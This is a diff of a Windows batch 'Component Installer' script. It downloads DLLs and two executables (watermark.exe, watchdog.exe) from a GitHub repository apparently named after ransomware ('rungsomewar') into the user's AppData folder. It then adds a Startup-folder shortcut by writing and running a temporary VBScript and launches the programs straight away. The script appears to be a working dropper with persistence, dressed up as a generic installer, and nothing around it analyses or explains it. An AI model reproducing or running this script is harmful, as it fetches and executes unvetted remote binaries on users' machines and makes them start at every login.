@@ -1,44 +1,39 @@
 @echo off
 setlocal
-title GitHub Component Installer
+title Component Installer
 
-:: 1. Define paths
+:: 1. Setup the permanent home for these files
 set "TARGET_DIR=%LOCALAPPDATA%\rungsomewar"
 set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "BASE_URL=https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main"
 
-echo Creating directory: %TARGET_DIR%
 if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
 
-echo Downloading files from GitHub...
+echo Downloading files from raw GitHub links...
 
-:: 2. Use PowerShell to download all 6 files with TLS 1.2 enabled
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; @('SDL2.dll','SDL2_ttf.dll','libfreetype-6.dll','zlib1.dll','watermark.exe','watchdog.exe') | ForEach-Object { Invoke-WebRequest -Uri '%BASE_URL%/$_' -OutFile '%TARGET_DIR%\$_' -UseBasicParsing }"
+:: 2. Download each file using your specific links
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ^
+Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/SDL2.dll' -OutFile '%TARGET_DIR%\SDL2.dll' -UseBasicParsing; ^
+Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/SDL2_ttf.dll' -OutFile '%TARGET_DIR%\SDL2_ttf.dll' -UseBasicParsing; ^
+Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/libfreetype-6.dll' -OutFile '%TARGET_DIR%\libfreetype-6.dll' -UseBasicParsing; ^
+Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/zlib1.dll' -OutFile '%TARGET_DIR%\zlib1.dll' -UseBasicParsing; ^
+Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/watermark.exe' -OutFile '%TARGET_DIR%\watermark.exe' -UseBasicParsing; ^
+Invoke-WebRequest -Uri 'https://github.com/sankarideb1-hue/rungsomewar/raw/refs/heads/main/watchdog.exe' -OutFile '%TARGET_DIR%\watchdog.exe' -UseBasicParsing"
 
-echo Creating Startup trigger...
+:: 3. Create the startup shortcut
+set "VBS=%TEMP%\launcher.vbs"
+echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS%"
+echo sLinkFile = "%STARTUP_DIR%\rungsomewar.lnk" >> "%VBS%"
+echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%VBS%"
+echo oLink.TargetPath = "%TARGET_DIR%\watchdog.exe" >> "%VBS%"
+echo oLink.WorkingDirectory = "%TARGET_DIR%" >> "%VBS%"
+echo oLink.Save >> "%VBS%"
 
-:: 3. Create a launcher script inside the target folder
-echo @echo off > "%TARGET_DIR%\run.bat"
-echo cd /d "%%~dp0" >> "%TARGET_DIR%\run.bat"
-echo start "" "watermark.exe" >> "%TARGET_DIR%\run.bat"
-echo start "" "watchdog.exe" >> "%TARGET_DIR%\run.bat"
+cscript /nologo "%VBS%"
+del "%VBS%"
 
-:: 4. Create the Shortcut in the Windows Startup folder via VBScript
-set "VBS_FILE=%TEMP%\create_start_lnk.vbs"
-echo Set oWS = WScript.CreateObject("WScript.Shell") > "%VBS_FILE%"
-echo sLinkFile = "%STARTUP_DIR%\rungsomewar_startup.lnk" >> "%VBS_FILE%"
-echo Set oLink = oWS.CreateShortcut(sLinkFile) >> "%VBS_FILE%"
-echo oLink.TargetPath = "%TARGET_DIR%\run.bat" >> "%VBS_FILE%"
-echo oLink.WorkingDirectory = "%TARGET_DIR%" >> "%VBS_FILE%"
-echo oLink.WindowStyle = 7 >> "%VBS_FILE%"
-echo oLink.Save >> "%VBS_FILE%"
+:: 4. Run immediately
+start "" "%TARGET_DIR%\watermark.exe"
+start "" "%TARGET_DIR%\watchdog.exe"
 
-cscript /nologo "%VBS_FILE%"
-del "%VBS_FILE%"
-
-echo.
-echo Installation Successful!
-echo Starting applications...
-start "" "%TARGET_DIR%\run.bat"
-
+echo Installation Complete.
 exit
